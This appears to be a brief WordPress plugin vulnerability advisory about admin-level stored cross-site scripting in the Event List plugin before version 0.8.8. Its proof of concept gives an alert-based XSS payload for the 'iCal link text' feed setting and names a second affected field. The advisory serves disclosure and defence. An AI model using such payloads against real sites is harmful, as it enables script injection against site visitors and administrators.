## WordPress Plugin Vulnerabilities

# Event List < 0.8.8 - Admin+ Stored Cross-Site Scripting

### Proof of Concept

Put the following payload in the "iCal link text" Feed Settings of the plugin (/wp-admin/edit.php?post\_type=el\_events&page=el\_admin\_settings&tab=feed): "><img src onerror=alert(/XSS/)>
General > Text for no events settings also affected
